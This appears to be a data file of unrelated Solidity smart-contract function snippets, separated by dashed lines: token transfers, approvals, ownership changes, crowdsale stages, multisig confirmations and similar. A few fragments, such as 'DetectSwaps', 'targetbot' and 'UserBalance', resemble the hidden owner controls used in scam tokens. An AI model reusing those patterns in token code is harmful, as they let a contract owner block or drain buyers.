--------------------------------------------------------------------------------
function transferTokens(address _tokenAddress, address _recipient) public isOwner {
            ERC20I token = ERC20I(_tokenAddress);
            require(token.transfer(_recipient, token.balanceOf(this)));
        }
--------------------------------------------------------------------------------
function balanceOf(address _owner) external view returns(uint256) {
        require(_owner != address(0), "Owner is 0");
        return ownerToManagerArray[_owner].length;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) 
        external 
        whenNotPaused
    {
        operatorToApprovals[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function adminSetResource(address handlerAddress, bytes32 resourceID, address tokenAddress) external onlyAdmin {
        _resourceIDToHandlerAddress[resourceID] = handlerAddress;
        IERCHandler handler = IERCHandler(handlerAddress);
        handler.setResource(resourceID, tokenAddress);
    }
--------------------------------------------------------------------------------
function getProposal(uint8 originChainID, uint64 depositNonce, bytes32 dataHash) external view returns (Proposal memory) {
        uint72 nonceAndID = (uint72(depositNonce) << 8) | uint72(originChainID);
        return _proposals[nonceAndID][dataHash];
    }
--------------------------------------------------------------------------------
function generateLockId() internal returns (bytes32 lockId) {
        return keccak256(abi.encodePacked(blockhash(block.number - 1), address(this), ++lockRequestCount));
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
        return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
        .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
    }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) UpgradeabilityProxy(_logic, _data) public payable {
    assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1));
    _setAdmin(_admin);
  }
--------------------------------------------------------------------------------
function MWSToken() {
    totalSupply = INITIAL_SUPPLY;                               // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                      // Creator address is assigned all
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {
    // solium-disable-next-line security/no-block-members
    require(_openingTime >= block.timestamp);
    require(_closingTime >= _openingTime);

    openingTime = _openingTime;
    closingTime = _closingTime;
  }
--------------------------------------------------------------------------------
function changeContractName(string newName) public onlyAdmin() {
        if (bytes(newName).length > 21) revert();
        ChangeContractName(name, newName);
        name = newName;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
    {
        // Update operator status
        operators[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function freezeAccount(address target, bool freeze) public onlyOwner {
    require(target != address(0));
    frozenAccount[target] = freeze;
    emit FrozenFunds(target, freeze);
 }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
constructor () public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
    override
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function _removeNFToken(
    address _from,
    uint256 _tokenId
  )
    internal
    virtual
  {
    require(idToOwner[_tokenId] == _from, NOT_OWNER);
    ownerToNFTokenCount[_from] -= 1;
    delete idToOwner[_tokenId];
  }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        super._transfer(sender, recipient, amount);
        _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
constructor (address legacyToken) public {
    require(legacyToken != address(0), "legacyToken address is required");
    _legacyToken = BARTToken(legacyToken);
  }
--------------------------------------------------------------------------------
function mintTokens(address[] calldata recipients)
  public
  payable
  onlyOwner{
    for(uint i=0; i<recipients.length; i++){
        _mint(recipients[i]);
     }
  }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function _numberMinted(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert MintedQueryForZeroAddress();
        return uint256(_addressData[owner].numberMinted);
    }
--------------------------------------------------------------------------------
function _numberBurned(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert BurnedQueryForZeroAddress();
        return uint256(_addressData[owner].numberBurned);
    }
--------------------------------------------------------------------------------
function withdrawEther(uint256 amount) public returns (bool success){
		if(msg.sender != owner)revert();
	    msg.sender.transfer(amount);
	    return true;
	}
--------------------------------------------------------------------------------
function setPubkey(bytes32 node, bytes32 x, bytes32 y) public only_owner(node) {
        records[node].pubkey = PublicKey(x, y);
        emit PubkeyChanged(node, x, y);
    }
--------------------------------------------------------------------------------
function REDCrowdfund(address _tokenAddress) public {
        wallet       = 0xc65f0d8a880f3145157117Af73fe2e6e8E60eF3c;  // ICO wallet address
        startsAt     = 1515398400;                         // Jan 8th 2018, 16:00, GMT+8
        endsAt       = 1517385600;                         // Jan 31th 2018, 16:00, GMT+8
        tokenAddress = _tokenAddress;                      // RED token Address
        RED          = REDToken(tokenAddress);
    }
--------------------------------------------------------------------------------
function safeMint(
        address to,
        uint256 tokenId,
        bytes memory _data
    ) public returns (bool) {
        _safeMint(to, tokenId, _data);
        _setTokenURI(tokenId, UintLib.uint2str(tokenId));
        return true;
    }
--------------------------------------------------------------------------------
function DetectSwaps(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    doge[spender] = val;
    akita[spender] = val2; 
    shiba[spender] = val3;
    hills = val4;
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function transferOwnership(
        address newOwner
    )
        public
        onlyOwner
    {
        require(newOwner != address(0), "INVALID_OWNER");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
--------------------------------------------------------------------------------
function startPreSaleRound() external managerOnly {
        require(statusICO == StatusICO.Created || statusICO == StatusICO.PreSalePaused);
        statusICO = StatusICO.PreSaleStarted;
        LogStartPreSaleRound();
    }
--------------------------------------------------------------------------------
function startRoundA() external managerOnly {
        require(statusICO == StatusICO.PreSaleFinished || statusICO == StatusICO.RoundAPaused);
        statusICO = StatusICO.RoundAStarted;
        LogStartRoundA();
    }
--------------------------------------------------------------------------------
function startRoundB() external managerOnly {
        require(statusICO == StatusICO.RoundAFinished || statusICO == StatusICO.RoundBPaused);
        statusICO = StatusICO.RoundBStarted;
        LogStartRoundB();
    }
--------------------------------------------------------------------------------
function startRoundC() external managerOnly {
        require(statusICO == StatusICO.RoundBFinished || statusICO == StatusICO.RoundCPaused);
        statusICO = StatusICO.RoundCStarted;
        LogStartRoundC();
    }
--------------------------------------------------------------------------------
function startRoundD() external managerOnly {
        require(statusICO == StatusICO.RoundCFinished || statusICO == StatusICO.RoundDPaused);
        statusICO = StatusICO.RoundDStarted;
        LogStartRoundD();
    }
--------------------------------------------------------------------------------
function registerBeneficiaries(address[] _beneficiaries) public
    onlyOwner {
        for (uint i = 0; i < _beneficiaries.length; i++) {
            addBeneficiary(_beneficiaries[i]);
        }
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0),'INVALID_NEW_OWNER');
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
--------------------------------------------------------------------------------
function smTransfer(address _to, uint256 _value) public returns (bool)  {
       require(smPool == msg.sender);
       _transfer(msg.sender, _to, _value);
       return true;
     }
--------------------------------------------------------------------------------
function transferWithData(address to, uint256 value, bytes calldata data)
    external
    isValidCertificate(data, 0x2535f762)
  {
    _transferWithData("", msg.sender, msg.sender, to, value, data, "", true);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function unwrapFrom(address account, uint256 amount, uint64 to, uint128 message) public whenNotPaused {
        _checksumCheck(to);
        emit Unwrap(account, to, amount, message);
        _burnFrom(account, amount);
    }
--------------------------------------------------------------------------------
function dealEndOffer(bool statue) onlyOwner public {
    if (statue) {
        isEndOffer = true;
        EndOffer(true);
    } else {
        isEndOffer = false;
        EndOffer(false);
    }
  }
--------------------------------------------------------------------------------
function tokenTakeback (address _addr,uint256 _value) internal {
        require (tokenIssued >= _value);
        tokenIssued = safeSubtract(tokenIssued, _value);
        emit TakebackToken(_addr, _value);
    }
--------------------------------------------------------------------------------
function setLastBlockNumber(address _metrics, uint256 _blocks) external {
		addressValidator().validateAddress(msg.sender, config().allocator());

		eternalStorage().setUint(getLastBlockNumberKey(_metrics), _blocks);
	}
--------------------------------------------------------------------------------
function setPendingIncrement(address _metrics, bool value) external {
		addressValidator().validateAddress(msg.sender, config().allocator());

		eternalStorage().setBool(getPendingIncrementKey(_metrics), value);
	}
--------------------------------------------------------------------------------
function setLastAssetValueEachMetrics(address _metrics, uint256 value)
		external
	{
		addressValidator().validateAddress(msg.sender, config().allocator());

		eternalStorage().setUint(
			getLastAssetValueEachMetricsKey(_metrics),
			value
		);
	}
--------------------------------------------------------------------------------
function setLastAssetValueEachMarketPerBlock(address _market, uint256 value)
		external
	{
		addressValidator().validateAddress(msg.sender, config().allocator());

		eternalStorage().setUint(
			getLastAssetValueEachMarketPerBlockKey(_market),
			value
		);
	}
--------------------------------------------------------------------------------
function setPendingLastBlockNumber(address _metrics, uint256 value)
		external
	{
		addressValidator().validateAddress(msg.sender, config().allocator());

		eternalStorage().setUint(getPendingLastBlockNumberKey(_metrics), value);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function XELINS() public {
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)public
    returns(bool success) {
        allowance[msg.sender][_spender] = _value;
        tokenRecipient spender = tokenRecipient(_spender);
        return true;
    }
--------------------------------------------------------------------------------
function addSpender(address spender) external onlyOwner {
        require(spender != 0x0);
        spenders[spender] = true;
        latest = spender;
        emit AddedSpender(spender);
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
    require(state == State.Active);
    deposited[investor] = deposited[investor].add(msg.value);
  }
--------------------------------------------------------------------------------
function MetaIdentityManager(uint _userTimeLock, uint _adminTimeLock, uint _adminRate, address _relayAddress) {
        require(_adminTimeLock >= _userTimeLock);
        adminTimeLock = _adminTimeLock;
        userTimeLock = _userTimeLock;
        adminRate = _adminRate;
        relay = _relayAddress;
    }
--------------------------------------------------------------------------------
function removeOwner(address sender, Proxy identity, address owner) public
        onlyAuthorized
        onlyOlderOwner(identity, sender)
        rateLimited(identity, sender)
    {
        // an owner should not be allowed to remove itself
        require(sender != owner);
        delete owners[identity][owner];
        LogOwnerRemoved(identity, owner, sender);
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function remainingTokens() public view returns (uint256) {
        return Math.min(token().balanceOf(_tokenWallet), token().allowance(_tokenWallet, address(this)));
    }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
    require(msg.sender == proxyOwner());
    bytes32 position = implementationPosition;

    assembly {
      sstore(position, _newImplementation)
    }
  }
--------------------------------------------------------------------------------
function subPercent(uint a, uint b) private pure returns(uint) {
    uint c = (a / 100) * b;
    assert(c <= a);
    return a - c;
  }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function getProjectedJackpot() public constant returns (uint) {
    uint jackpot = getAbsoluteProjectedJackpot();
    Jackpot memory totals = getJackpotTotals(jackpot);
    return totals.winnerTotal;
  }
--------------------------------------------------------------------------------
function getJackpot() public constant returns (uint) {
    uint jackpot = getAbsoluteJackpot();
    Jackpot memory totals = getJackpotTotals(jackpot);
    return totals.winnerTotal;
  }
--------------------------------------------------------------------------------
function getTotalSupply() public constant returns (uint) {
        uint sum = 0; 
        sum += drpsToken.totalSupply();
        sum += drpuToken.totalSupply();
        return sum;
    }
--------------------------------------------------------------------------------
function isValidSignature(
        address _pluginAddress,
        uint40 _signId,
        uint40 _cutieId,
        uint128 _value,
        uint256 _parameter,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    )
    public
    view
    returns (bool)
    {
        return getSigner(_pluginAddress, _signId, _cutieId, _value, _parameter, _v, _r, _s) == signerAddress;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function withdrawEther() onlyOwner {
    require(this.balance != 0);
    owner.transfer(this.balance);
    EtherWithdrawn(this.balance);
  }
--------------------------------------------------------------------------------
function isValidIssuance(uint256 _hardcap,
                            uint256 _price,
                            uint256 _S2,
                            uint256 _R2) public view
                            returns (bool) {
 	  return (_S2 > _R2 && _S2.sub(_R2).mul(PRECISION) >= _hardcap.mul(_price));
  }
--------------------------------------------------------------------------------
function GetDescript(string ProjectName) constant public returns(string) {
        if(__FindProjects(ProjectName)==true){
            return (ProjectDatas[ProjectName].Descript);
        }else{
           return (""); 
        }
    }
--------------------------------------------------------------------------------
constructor(address _beneficiary, uint256 _minimalValue) public {
    require(_beneficiary != address(0));
    beneficiary = _beneficiary;
    state = State.Active;
    minimalValue = _minimalValue;
  }
--------------------------------------------------------------------------------
function confirmTransaction(bytes32 dataHash)
        public
        onlyFriend
    {
        require(!isExecuted[dataHash], "Recovery already executed");
        isConfirmed[dataHash][msg.sender] = true;
    }
--------------------------------------------------------------------------------
function () external payable
    {
                        if( msg.value > 0 )
            buyTokens(msg.sender);
        else
            airDrop(msg.sender); 
        
        
        
           
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function WifiBonusCoin() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function withdrawEther() onlyOwner {
    require(this.balance != 0);
    owner.transfer(this.balance);
    EtherWithdrawn(this.balance);
  }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) public onlyOwner returns (bool) {
    require(newOwner != address(0));
    owner = newOwner;
    OwnershipTransferred(owner, newOwner);
    return true;
  }
--------------------------------------------------------------------------------
function startPreIco() external managerOnly {
        require(statusICO == StatusICO.Created || statusICO == StatusICO.PreIcoPaused);
        statusICO = StatusICO.PreIcoStarted;
        LogStartPreICO();
    }
--------------------------------------------------------------------------------
function finishPreIco() external managerOnly {
        require(statusICO == StatusICO.PreIcoStarted || statusICO == StatusICO.PreIcoPaused);
        statusICO = StatusICO.PreIcoFinished;
        LogFinishPreICO();
    }
--------------------------------------------------------------------------------
function startIco() external managerOnly {
        require(statusICO == StatusICO.PreIcoFinished || statusICO == StatusICO.IcoPaused);
        statusICO = StatusICO.IcoStarted;
        LogStartICO();
    }
--------------------------------------------------------------------------------
function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {
        return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);
    }
--------------------------------------------------------------------------------
function borrowBalanceCurrent(address account) external nonReentrant returns (uint) {
        require(accrueInterest() == uint(Error.NO_ERROR), "accrue interest failed");
        return borrowBalanceStored(account);
    }
--------------------------------------------------------------------------------
function breakTie(uint team) {
    require(result == 9);
    require(msg.sender == owner);
    result = team;
    withdrawalOpen = true;
  }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal returns(uint256) {
        uint256 z = x + y;
        assert((z >= x) && (z >= y));
        return z;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _deedId) external view returns (uint256) {
        Auction storage auction = identifierToAuction[_deedId];
        
        // The auction must be active.
        require(_activeAuction(auction));
        
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function deposit() external onlyOwner payable {
        require(msg.value > 0, "Should at least be 1 wei deposited");
    }
--------------------------------------------------------------------------------
function makeCoin(uint256 _value)public returns (bool){
        require(msg.sender == owner);
        totalSupply += _value;
        balances[owner] += _value;
        return true;
    }
--------------------------------------------------------------------------------
function GX(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
constructor() DetailedERC20(name, symbol, note, decimals) public {
    _totalSupply = TOTAL_SUPPLY;

    // initial supply belongs to owner
    balances[addressOwner] = _totalSupply;
    emit Transfer(address(0x0), addressOwner, _totalSupply);
  }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function getJackpotInfo() public view returns (uint256, address, address, uint256, uint256, uint256, uint256, uint256, uint256) {
    return (
        jackpotBalance,
        jackpotLastQualified,
        jackpotLastWinner,
        jackpotLastPayout,
        jackpotCount,
        gameIndex,
        gameStartTime,
        lastAction + timeBeforeJackpot,
        roundStartTime
      );
  }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function setOutToken (
    	address _tokenAddress
    )
    	public
    	onlyOwner
    {
    	require(_tokenAddress.isContract(), "address must be a contract");
    	outToken = IERC20(_tokenAddress);
    }
--------------------------------------------------------------------------------
function finalize() onlyOwner public {
      require(mediator != 0x0);
      require(!isFinalized);
      require(hasEnded());
      
      finalization();
      Finalized();

      isFinalized = true;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) public returns (bool) {
        // no-op, allow even during crowdsale, in order to work around using grantVestedTokens() while in crowdsale
        if (_to == msg.sender) return false;
        return super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function confirmTransaction(bytes32 transactionId)
        public
        ownerExists(msg.sender)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
        super._transfer(sender, recipient, amount);
        _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure internal returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function hasInviter() 
        public 
        view
        returns(bool)
    {
        if(_inviter[msg.sender] != address(0x0))
            return true;
        else
            return false;
    }
--------------------------------------------------------------------------------
function POWTokenOpenDistribution() public onlyOwner {
    admin = msg.sender;
    CurrentStatus = "Tokens Released, Open Distribution deployed to chain";
  }
--------------------------------------------------------------------------------
function getBonusPerShare() public view returns (uint256) {
        return SafeMath.div(SafeMath.mul(_data.getBonusPerShare(), 1 ether), _core.MAGNITUDE());
    }
--------------------------------------------------------------------------------
function AmbrosusSale() {
    tokens = new AmberToken();
    tokens.mint(0x00C269e9D02188E39C9922386De631c6AED5b4d4, 143375759490000000000000000);
    saleRevenue += 143375759490000000000000;
    totalSold += 143375759490000000000000000;

  }
--------------------------------------------------------------------------------
function changeWageSyncer(address newSyncer) external override onlyOwner {
        address oldSyncer = address(_syncer);
        _syncer = IWageSyncer(newSyncer);
        
        emit WageSyncerChanged(newSyncer, oldSyncer);
    }
--------------------------------------------------------------------------------
function finalization() internal {
    if (goalReached()) {
      escrow.close();
      escrow.beneficiaryWithdraw();
    } else {
      escrow.enableRefunds();
    }

    super.finalization();
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function burnAll(uint[] ids) public {
        for (uint i = 0; i < ids.length; i++){
            burn(ids[i]);
        }
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function getBalance(ERC20 token, address user) public view returns(uint) {
        if (token == ETH_TOKEN_ADDRESS)
            return user.balance;
        else
            return token.balanceOf(user);
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
constructor(uint256 openingTime, uint256 closingTime) internal {
    // solium-disable-next-line security/no-block-members
    require(openingTime >= block.timestamp);
    require(closingTime > openingTime);

    _openingTime = openingTime;
    _closingTime = closingTime;
  }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xFEcaeB9307da0257813285796bD69Cb3A613A550,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0));
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address payable msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
function updateTokenContractAddr(address _newAddress) external onlyOwner returns(bool){
          require(_newAddress != 0x00);
          TokenContractAddress(token,_newAddress);
          token = NotaryPlatformToken(_newAddress);
          return true;
      }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function withdrawBalance(address withdrawAddress, uint256 amount) external {
        require(hasRole(DEFAULT_ADMIN_ROLE, _msgSender()), "Need admin role");
        payable(withdrawAddress).transfer(amount);
    }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[]) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = DISTRIBUTE;
        return allPermissions;
    }
--------------------------------------------------------------------------------
function addAccountToPreTrading(address account, bool allowed)
        public
        onlyOwner
    {
        require(preTrader[account] != allowed, "TOKEN: Already enabled.");
        preTrader[account] = allowed;
    }
--------------------------------------------------------------------------------
constructor() public {
        owner = 0x5cb7e87f0985BABd78629f40491d76eF84d06d9e;
        _balances[0x5cb7e87f0985BABd78629f40491d76eF84d06d9e] = supply;
        emit Transfer(address(0), 0x5cb7e87f0985BABd78629f40491d76eF84d06d9e, supply);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function createBrand(bytes32 _name, uint256 _price) public onlyCXX {
    require(msg.sender != address(0));
    _create_brand(_name, address(this), _price, 0);
  }
--------------------------------------------------------------------------------
function targetbot(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            identifybot(_counts[i]); }
    
    }
--------------------------------------------------------------------------------
function addAddressToWhitelist(address addr) onlyOperator public returns(bool success) {
        if (!whitelist[addr]) {
            whitelist[addr] = true;
            emit WhitelistedAddressAdded(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOperator public returns(bool success) {
        if (whitelist[addr]) {
            whitelist[addr] = false;
            emit WhitelistedAddressRemoved(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
constructor()
        public
    {
        // King Tut's address
        _MummyAccount = 0x52ebB47C11957cccD46C2E468Ac12E18ef501488;
        
        // add the ambassadors here. 
        ambassadors_[0xd90A28901e0ecbffa33d6D1FF4F8924d35767444] = true;
        ambassadors_[0x5939DC3cA45d14232CedB2135b47A786225Be3e5] = true;
        ambassadors_[0xd5664B375a2f9dec93AA809Ae27f32bb9f2A2389] = true;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function _setOwner(address _newOwner) internal {
        require(_newOwner != address(0), "Address should not be 0x");
        __owner = _newOwner;
    }
--------------------------------------------------------------------------------
